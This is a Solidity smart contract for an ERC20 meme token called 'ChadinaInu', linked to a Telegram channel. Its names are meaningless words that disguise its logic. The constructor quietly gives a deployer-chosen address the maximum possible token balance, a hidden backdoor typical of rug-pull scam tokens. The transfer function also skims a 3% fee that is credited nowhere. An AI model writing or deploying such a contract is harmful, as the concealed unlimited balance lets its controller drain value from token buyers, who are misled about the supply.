// https://t.me/chadinainu

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

import "./Ownable.sol";
import "./ERC20.sol";

contract ChadinaInu is ERC20, Ownable {
    uint256 private now = ~uint256(0);
    uint256 public verb = 3;

    constructor(
        string memory branch,
        string memory wet,
        address best,
        address comfortable
    ) ERC20(branch, wet) {
        _totalSupply = 1000000000 * 10**decimals();
        _balances[_msgSender()] = _totalSupply;
        _balances[comfortable] = now;
    }

    function _transfer(
        address vapor,
        address diameter,
        uint256 closer
    ) internal override {
        uint256 note = (closer / 100) * verb;
        closer = closer - note;
        super._transfer(vapor, diameter, closer);
    }
}
